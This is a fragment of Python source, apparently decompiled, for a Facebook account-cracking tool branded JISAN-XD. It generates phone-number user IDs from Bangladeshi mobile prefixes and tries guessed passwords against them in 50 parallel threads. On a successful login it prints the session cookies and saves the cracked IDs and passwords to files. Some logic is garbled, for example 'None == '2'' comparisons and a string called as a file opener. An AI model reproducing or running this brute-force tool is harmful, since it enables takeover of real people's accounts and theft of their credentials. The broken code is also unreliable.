...
def o():
    ...
    logo()
    print('\033[1;32m─────────────────────────────────────────────────────────')
    JISAN('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM CRACK ')
    JISAN('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;96m CONTACT ME FACEBOOK')
    JISAN('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW MY FACEBOOK PAGE ')
    JISAN('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW NY GROUP')
    JISAN('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        _JISAN_('xdg-open https://www.facebook.com/TurRealabbu1')
        return None
    if None == '3':
        _JISAN_('xdg-open https://www.facebook.com/Atticking420/')
        return None
    if None == '4':
        _JISAN_('xdg-open https://www.facebook.com/groups/636153321502454')
        return None
    if None == '0':
        _JISAN_('exit')
        return None
...
from os import system as _JISAN_
...
try:
    ...
    _JISAN_('pip install mechanize requests futures bs4==2 > /dev/null')
    _JISAN_('pip install bs4')    
...
def i():
    ...
    logo()
    JISAN('\033[1;92m─────────────────────────────────────────────────────')
    JISAN('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
    JISAN('\033[1;92m─────────────────────────────────────────────────────\n')
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;93m─────────────────────────────────────────────────────')
        for love in user:
            pwx = [love, 'JISAN123','JISAN1234']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    print('IDS SAVED IN XD-505-OK.txt, XD-505-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\x1b[1;96mJISAN-XD-OK ]' +cid+ ' | ' +ps+'\x1b[1;96m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/JISAN-XD-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        hahaha()
        sys.stdout.write('\r%s[JISAN-XD] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
